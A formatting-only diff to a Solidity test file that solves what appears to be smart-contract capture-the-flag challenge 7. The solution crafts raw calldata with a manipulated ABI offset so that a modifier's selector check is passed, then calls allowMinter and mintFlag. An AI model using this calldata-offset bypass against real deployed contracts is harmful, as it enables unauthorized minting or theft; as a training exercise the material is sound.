@@ -22,7 +22,7 @@ contract Challenge7Test is BaseTest {
 
         // The modifier checks the transaction's calldata at index 68 for the mintFlag selector.
         // We must manually craft calldata to call mint(bytes) with a custom offset for the 'bytes' parameter.
-        
+
         bytes4 mintBytesSelector = bytes4(keccak256("mint(bytes)"));
         bytes4 targetCheckSelector = challenge7.mintFlagSelector();
         bytes4 allowSelector = bytes4(keccak256("allowMinter()"));
@@ -39,7 +39,7 @@ contract Challenge7Test is BaseTest {
         // Index 164-167: allowMinter selector
         bytes memory payload1 = abi.encodePacked(
             mintBytesSelector,
-            uint256(128), 
+            uint256(128),
             uint256(0),
             targetCheckSelector,
             bytes28(0),
@@ -48,13 +48,13 @@ contract Challenge7Test is BaseTest {
             allowSelector
         );
 
-        (bool success1, ) = address(challenge7).call(payload1);
+        (bool success1,) = address(challenge7).call(payload1);
         require(success1, "allowMinter call failed");
 
         // Step 2: Craft calldata to call mintFlag()
         bytes memory payload2 = abi.encodePacked(
             mintBytesSelector,
-            uint256(128), 
+            uint256(128),
             uint256(0),
             targetCheckSelector,
             bytes28(0),
@@ -63,7 +63,7 @@ contract Challenge7Test is BaseTest {
             mintFlagSelector
         );
 
-        (bool success2, ) = address(challenge7).call(payload2);
+        (bool success2,) = address(challenge7).call(payload2);
         require(success2, "mintFlag call failed");
 
         // DONE: You should have obtained the flag for challenge #7
